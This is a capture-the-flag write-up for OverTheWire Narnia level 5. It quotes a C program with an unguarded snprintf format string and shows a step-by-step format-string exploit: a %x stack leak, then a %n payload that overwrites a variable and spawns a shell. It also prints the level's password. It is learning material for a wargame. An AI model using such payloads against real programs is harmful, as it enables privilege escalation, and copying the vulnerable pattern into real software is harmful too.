## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #FormatString #BinaryExploitation
**Completion Date & Time :** 2026 - 02 - 26 / 14:53

---
## FLAG : `uK3ikaZLxB`

---
## Solution :

### Step 1 : Check for `narnia5.c` file.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

This program ask for an *`argument`* and our task is to modify the value `i` from 1 to 500.
Looks carefully on `snprintf(buffer, sizeof buffer, argv[1]);`, this line mean, it will just do `printf(buffer)` with saving the output in `buffer`, it has no any guards. This could lead to [[Format String Attack]].

### Step 2 : Find the Gap and `i` address.

Input Payload : 
```bash
narnia5@narnia:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x   
```
Result : 
```console
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA.41414141.3431342e.34313431.34332e31.34333133] (49)
i = 1 (0xffffd3a0)
```

From the output above, we obtain some information :
1. The address of i is `0xffffd3a0`
2. Look closely on the leaked buffer, `AAAA` is 4 of our first input, `.41414141.`, is the result of `.%x.`, this mean the *Arguments pointer* is directly point to the `buffer[0]` not the `Argv[1]`. See the next part, `3431342e`, in Little endian this mean `.414`, this match out theory before, which the *Arguments pointer* directly point to `buffer[0]`. This happens because `snprintf` will write everything of the output in `buffer`. So the output after `AAAA.%x`, this will be `AAAA.41414141`, and this is saved in `buffer`.
3. So we knew there are no *gap* between our first input with the *Argument pointer*, this mean we must put a padding of 4 bytes at the beginning before we write the `i` address, so the `%x` will printout the padding, not the actual address.

### Step 3 : Build Payload

Here is the payload :
```bash
perl -e 'print "AAAA" . "\xa0\xd3\xff\xff" . "%492x%n" '
```
Explanation : 
1. As we planned before, we put 4 bytes in the beginning as padding
2. Put the Address of `i`
3. So, here how it works. The first `%492x` will read from the stack, it will takes the first group, since the *Argument Pointer*  point to `buffer[0]` immediately, it will print out `AAAA` **WITH** `492 of spaces` at the right side of A. 
4. Next, the `%n` will see, how many output have been saved (since this is `snprintf` so it counts the output have been saved, not have been shown on `stdout`). First, it has **4 bytes of initiall padding**, then **4 bytes of address** and **492 bytes of padding + %x** (the 492 bytes have include the padding with output of x, not x + 492 padding). So since we have **500** bytes of output already, then the `%n` will look for second group, which is `buffer[4] - buffer[7]` which is the address `\xa0\xd3\xff\xff` and will directly save the value `500` into the address.

Input Payload : 
```bash
narnia5@narnia:/narnia$ ./narnia5 $(perl -e 'print "AAAA" . "\xa0\xd3\xff\xff" . "%492x%n" ')
```
The result :
```shell
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
uK3ikaZLxB

```

---
### Key Takeaways : 
- The only different between printf and snprintf is where they put the output.

---
## Related Concepts : 
[[snprintf()]], [[printf()]], [[Format String Attack]]

---
## Next Challenge :
[[Narnia (6 -> 7)]]